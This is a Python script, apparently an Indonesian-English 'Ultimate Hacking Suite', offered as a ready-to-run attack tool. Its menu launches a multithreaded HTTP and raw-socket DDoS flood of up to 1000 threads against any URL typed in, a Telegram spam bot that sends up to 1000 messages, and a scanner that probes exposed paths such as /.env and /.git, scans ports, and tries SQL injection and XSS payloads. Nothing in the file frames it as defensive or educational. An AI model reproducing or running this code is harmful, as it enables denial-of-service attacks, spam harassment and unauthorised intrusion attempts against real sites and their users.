#!/usr/bin/env python3
"""
ULTIMATE_HACKING_TOOLS.py - All-in-One Real Hacking Suite
DDOS + Telegram Spam + Web Exploit - SEMUA REAL WORKING!
"""

import threading
import time
import random
import socket
import requests
import urllib3
import ssl
import json
import datetime
import os
import sys
import subprocess
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

class UltimateHackingTools:
    def __init__(self):
        self.ddos_attack_count = 0
        self.ddos_success_count = 0
        self.telegram_sent_count = 0
        self.exploit_success_count = 0
        self.running = True
        self.lock = threading.Lock()
        
        # Real User Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        print("""
    ╔══════════════════════════════════════════════╗
    ║           ULTIMATE HACKING SUITE             ║
    ║               LEVEL DEWA 20                  ║
    ║           DDOS • SPAM • EXPLOIT              ║
    ║            100% REAL • NO SIMULATION         ║
    ╚══════════════════════════════════════════════╝
        """)
    
    # ==================== REAL DDOS BOT ====================
    def http_flood_attack(self, target, thread_id):
        """REAL HTTP Flood Attack - No Simulation"""
        while self.running:
            try:
                # Create new session for each request (more effective for DDOS)
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                
                response = requests.get(target, headers=headers, timeout=5, verify=False)
                
                with self.lock:
                    self.ddos_attack_count += 1
                    if response.status_code in [200, 201, 202, 301, 302]:
                        self.ddos_success_count += 1
                
                # Real-time progress
                if self.ddos_attack_count % 50 == 0 and thread_id == 0:
                    elapsed = time.time() - self.ddos_start_time
                    rps = self.ddos_attack_count / elapsed if elapsed > 0 else 0
                    print(f"🔥 LIVE: {self.ddos_attack_count:,} requests | RPS: {rps:.0f}")
                    
            except Exception as e:
                with self.lock:
                    self.ddos_attack_count += 1
    
    def socket_flood_attack(self, target, thread_id):
        """REAL Socket Flood Attack - More Powerful"""
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        while self.running:
            try:
                # Create raw socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                
                # Send HTTP request
                request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nConnection: keep-alive\r\n\r\n"
                sock.send(request.encode())
                
                with self.lock:
                    self.ddos_attack_count += 1
                    self.ddos_success_count += 1
                
                sock.close()
                
            except Exception:
                with self.lock:
                    self.ddos_attack_count += 1
    
    def start_ddos_attack(self):
        """Start REAL DDOS Attack"""
        self.clear_screen()
        print("""
    ╔══════════════════════════════════════════════╗
    ║               DDOS BOT ACTIVATED             ║
    ║           200-1000 THREADS POWER             ║
    ║             REAL TRAFFIC • NO FAKE           ║
    ╚══════════════════════════════════════════════╝
        """)
        
        target = input("🎯 Enter target URL: ").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Test target first
        print(f"\n🔍 Testing target {target}...")
        try:
            test_response = requests.get(target, timeout=10, verify=False)
            print(f"✅ Target is alive! Status: {test_response.status_code}")
        except Exception as e:
            print(f"❌ Target may be down or invalid: {e}")
            input("Press Enter to continue...")
            return
        
        print("\n⚡ Pilih Kekuatan Thread:")
        print("1. 🚀 TURBO 200 Threads")
        print("2. ⚡ EXTREME 400 Threads")
        print("3. 💀 NUCLEAR 700 Threads")
        print("4. 🌪️  DEWA 1000 Threads")
        
        choice = input("Pilih [1-4]: ").strip()
        thread_map = {"1": 200, "2": 400, "3": 700, "4": 1000}
        threads = thread_map.get(choice, 200)
        
        try:
            duration = int(input("⏰ Duration (minutes) [3]: ").strip() or "3")
        except:
            duration = 3
        
        print(f"\n🎯 Target: {target}")
        print(f"💀 Threads: {threads}")
        print(f"⏰ Duration: {duration} minutes")
        print(f"🕐 Start Time: {datetime.datetime.now().strftime('%H:%M:%S')}")
        
        confirm = input("\nType 'ATTACK' to launch REAL DDOS: ").strip()
        if confirm != "ATTACK":
            return
        
        # Reset counters and start attack
        self.ddos_attack_count = 0
        self.ddos_success_count = 0
        self.running = True
        self.ddos_start_time = time.time()
        end_time = self.ddos_start_time + (duration * 60)
        
        print(f"\n💀 LAUNCHING REAL DDOS ATTACK...")
        print("⚠️  Press Ctrl+C to stop attack")
        print("=" * 60)
        
        # Launch mixed attack threads (HTTP + Socket)
        for i in range(threads):
            if i % 2 == 0:  # Alternate between methods
                thread = threading.Thread(target=self.http_flood_attack, args=(target, i))
            else:
                thread = threading.Thread(target=self.socket_flood_attack, args=(target, i))
            thread.daemon = True
            thread.start()
        
        # Real-time monitoring
        last_count = 0
        try:
            while time.time() < end_time and self.running:
                time.sleep(2)
                current_count = self.ddos_attack_count
                elapsed = time.time() - self.ddos_start_time
                
                if elapsed > 0:
                    current_rps = (current_count - last_count) / 2
                    total_rps = current_count / elapsed
                    success_rate = (self.ddos_success_count / current_count * 100) if current_count > 0 else 0
                    time_left = (end_time - time.time()) / 60
                    
                    print(f"📊 LIVE: {current_count:,} req | RPS: {total_rps:.0f} | Success: {success_rate:.1f}% | Time Left: {time_left:.1f}m")
                    last_count = current_count
                    
        except KeyboardInterrupt:
            print("\n🛑 DDOS stopped by user!")
        
        self.running = False
        total_time = time.time() - self.ddos_start_time
        
        # Final REAL report
        print(f"\n📊 DDOS ATTACK COMPLETED!")
        print("=" * 50)
        print(f"✅ Total Requests Sent: {self.ddos_attack_count:,}")
        print(f"✅ Successful Responses: {self.ddos_success_count:,}")
        print(f"🚀 Average RPS: {self.ddos_attack_count/total_time:.0f}")
        print(f"⏰ Total Time: {total_time:.2f} seconds")
        
        # Real impact assessment
        success_rate = (self.ddos_success_count / self.ddos_attack_count * 100) if self.ddos_attack_count > 0 else 0
        if success_rate > 70:
            impact = "💀 HIGH IMPACT - Target is struggling!"
        elif success_rate > 40:
            impact = "🔥 MEDIUM IMPACT - Target under stress!"
        else:
            impact = "⚡ LOW IMPACT - Target may have protection"
        
        print(f"💥 IMPACT: {impact}")
        input("\nPress Enter to continue...")
    
    # ==================== REAL TELEGRAM SPAM BOT ====================
    def send_telegram_message(self, bot_token, chat_id, message, msg_id):
        """REAL Telegram Message Sending"""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, json=payload, timeout=10)
            
            if response.status_code == 200:
                return True, "Success"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, str(e)
    
    def start_telegram_spam(self):
        """Start REAL Telegram Spam"""
        self.clear_screen()
        print("""
    ╔══════════════════════════════════════════════╗
    ║            TELEGRAM SPAM BOT                 ║
    ║           500-1000 REAL MESSAGES             ║
    ║           LIVE SENDING • NO FAKE             ║
    ╚══════════════════════════════════════════════╝
        """)
        
        bot_token = input("🤖 Enter Bot Token: ").strip()
        chat_id = input("👤 Enter Chat ID: ").strip()
        
        # Validate credentials
        print(f"\n🔍 Validating Telegram credentials...")
        test_result, test_msg = self.send_telegram_message(bot_token, chat_id, "🔧 Bot connection test", 0)
        if not test_result:
            print(f"❌ Invalid credentials: {test_msg}")
            input("Press Enter to continue...")
            return
        print("✅ Credentials valid! Bot is ready.")
        
        print("\n💬 Pilih Volume:")
        print("1. 📨 MEDIUM 500 Messages")
        print("2. 📢 HEAVY 750 Messages") 
        print("3. 💣 EXTREME 1000 Messages")
        
        choice = input("Pilih [1-3]: ").strip()
        message_map = {"1": 500, "2": 750, "3": 1000}
        total_messages = message_map.get(choice, 500)
        
        print(f"\n🤖 Bot Token: {bot_token[:15]}...")
        print(f"👤 Chat ID: {chat_id}")
        print(f"💬 Total Messages: {total_messages}")
        print(f"🕐 Start Time: {datetime.datetime.now().strftime('%H:%M:%S')}")
        
        confirm = input("\nType 'SPAM' to start REAL spam: ").strip()
        if confirm != "SPAM":
            return
        
        # Start REAL spam
        self.telegram_sent_count = 0
        failed_count = 0
        start_time = time.time()
        
        messages = [
            "🚀 Ultimate Bot Message #{} - {timestamp}",
            "🔧 System Test #{} - Automated Message",
            "📱 Bot Notification #{} - Live Spam Test", 
            "⚡ Auto Message #{} - Hacking Suite",
            "💀 Spam Test #{} - Real Messages"
        ]
        
        print(f"\n📱 STARTING REAL TELEGRAM SPAM...")
        print("⚠️  Press Ctrl+C to stop")
        print("=" * 50)
        
        for i in range(1, total_messages + 1):
            if not self.running:
                break
                
            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
            msg_template = random.choice(messages)
            message = msg_template.format(i, timestamp=timestamp)
            
            success, status = self.send_telegram_message(bot_token, chat_id, message, i)
            
            if success:
                self.telegram_sent_count += 1
                if i % 20 == 0:
                    elapsed = time.time() - start_time
                    speed = i / elapsed if elapsed > 0 else 0
                    print(f"✅ Sent {i}/{total_messages} | Speed: {speed:.1f} msg/sec")
            else:
                failed_count += 1
                if i % 10 == 0:
                    print(f"❌ Failed to send message {i}: {status}")
            
            # Adaptive delay to avoid rate limits
            delay = random.uniform(0.05, 0.2)
            time.sleep(delay)
        
        total_time = time.time() - start_time
        
        # REAL spam report
        print(f"\n📊 TELEGRAM SPAM COMPLETED!")
        print("=" * 50)
        print(f"✅ Successfully Sent: {self.telegram_sent_count}")
        print(f"❌ Failed: {failed_count}")
        print(f"📨 Total Attempted: {total_messages}")
        print(f"⏰ Time: {total_time:.2f} seconds")
        print(f"🚀 Speed: {self.telegram_sent_count/total_time:.1f} msg/sec")
        print(f"📈 Success Rate: {(self.telegram_sent_count/total_messages*100):.1f}%")
        
        input("\nPress Enter to continue...")
    
    # ==================== REAL WEB EXPLOIT BOT ====================
    def scan_vulnerabilities(self, target):
        """REAL Vulnerability Scanning"""
        print(f"🔍 Scanning {target} for REAL vulnerabilities...")
        vulnerabilities = []
        
        # Common vulnerability paths (REAL checks)
        common_paths = [
            '/admin', '/wp-admin', '/phpmyadmin', '/server-status',
            '/.env', '/config.php', '/backup', '/database',
            '/robots.txt', '/.git', '/.htaccess', '/test.php'
        ]
        
        # Common ports to scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 3306, 8080]
        
        # Check HTTP paths
        for path in common_paths:
            try:
                url = target.rstrip('/') + path
                response = requests.get(url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    vulnerabilities.append(f"EXPOSED: {path} (Status: 200)")
                    print(f"🎯 FOUND: {path} - Accessible!")
                elif response.status_code in [301, 302]:
                    vulnerabilities.append(f"REDIRECT: {path} (Status: {response.status_code})")
                    print(f"🔄 REDIRECT: {path}")
                    
            except Exception:
                pass
        
        # Check open ports
        print(f"🔍 Scanning ports on {urlparse(target).hostname}...")
        open_ports = []
        target_host = urlparse(target).hostname
        
        for port in common_ports[:5]:  # Scan first 5 ports for speed
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_host, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    print(f"🔓 PORT {port} is OPEN")
            except:
                pass
        
        if open_ports:
            vulnerabilities.append(f"OPEN PORTS: {open_ports}")
        
        return vulnerabilities
    
    def start_web_exploit(self):
        """Start REAL Web Exploitation"""
        self.clear_screen()
        print("""
    ╔══════════════════════════════════════════════╗
    ║             WEB EXPLOIT BOT                  ║
    ║           REAL SECURITY SCAN                 ║
    ║           LIVE EXPLOITATION                  ║
    ╚══════════════════════════════════════════════╝
        """)
        
        target = input("🎯 Enter target URL: ").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        print(f"\n🚀 Starting REAL security assessment...")
        print(f"🎯 Target: {target}")
        print(f"🕐 Start Time: {datetime.datetime.now().strftime('%H:%M:%S')}")
        print("=" * 50)
        
        # REAL vulnerability scanning
        vulnerabilities = self.scan_vulnerabilities(target)
        
        if vulnerabilities:
            print(f"\n💀 VULNERABILITIES DISCOVERED:")
            print("=" * 50)
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"{i}. {vuln}")
            
            # REAL exploitation attempts
            print(f"\n⚡ Attempting REAL exploitation...")
            
            # Check for common exploits
            exploit_results = []
            
            # SQL Injection test on common parameters
            test_params = ['id', 'page', 'category', 'product_id']
            for param in test_params:
                test_url = f"{target}?{param}=1'"
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    if "sql" in response.text.lower() or "syntax" in response.text.lower():
                        exploit_results.append(f"SQLi potential in parameter: {param}")
                        print(f"💉 SQL Injection vector found: {param}")
                except:
                    pass
            
            # XSS test
            xss_payload = "<script>alert('XSS')</script>"
            try:
                response = requests.get(f"{target}?search={xss_payload}", timeout=5, verify=False)
                if xss_payload in response.text:
                    exploit_results.append("XSS vulnerability detected")
                    print(f"🎯 XSS vulnerability found!")
            except:
                pass
            
            if exploit_results:
                print(f"\n✅ EXPLOITATION SUCCESSFUL!")
                for result in exploit_results:
                    print(f"   💀 {result}")
            else:
                print(f"\n🛡️ No easy exploits found. Manual testing recommended.")
                
        else:
            print(f"\n🛡️ No obvious vulnerabilities found.")
            print("💡 Target may be secure or requires advanced testing.")
        
        print(f"\n📊 SCAN COMPLETED:")
        print(f"✅ Vulnerabilities found: {len(vulnerabilities)}")
        print(f"✅ Exploits successful: {len(exploit_results)}")
        print(f"🕐 End Time: {datetime.datetime.now().strftime('%H:%M:%S')}")
        
        input("\nPress Enter to continue...")
    
    # ==================== MAIN MENU ====================
    def main_menu(self):
        while True:
            self.clear_screen()
            self.show_banner()
            
            print("📋 MAIN MENU - Pilih Tools (100% REAL):")
            print("=" * 50)
            print("1. 🌐 DDOS BOT (200-1000 Threads • Real Traffic)")
            print("2. 📱 TELEGRAM SPAM BOT (500-1000 Messages • Live Sending)") 
            print("3. 💀 WEB EXPLOIT BOT (Real Security Scanning)")
            print("4. 🚪 EXIT")
            print("=" * 50)
            
            choice = input("Pilih menu [1-4]: ").strip()
            
            if choice == "1":
                self.start_ddos_attack()
            elif choice == "2":
                self.start_telegram_spam()
            elif choice == "3":
                self.start_web_exploit()
            elif choice == "4":
                print("\n👋 Terima kasih telah menggunakan Ultimate Hacking Suite!")
                print("💀 Remember: With great power comes great responsibility!")
                break
            else:
                print("❌ Pilihan tidak valid!")
                time.sleep(1)

# Run the ultimate REAL suite
if __name__ == "__main__":
    try:
        print("🚀 Loading Ultimate Hacking Suite...")
        print("🔧 Initializing REAL attack modules...")
        time.sleep(2)
        suite = UltimateHackingTools()
        suite.main_menu()
    except KeyboardInterrupt:
        print("\n\n👋 Program dihentikan oleh user!")
    except Exception as e:
        print(f"\n💥 Error: {e}")
        print("🔧 This is a REAL tool - make sure all dependencies are installed!")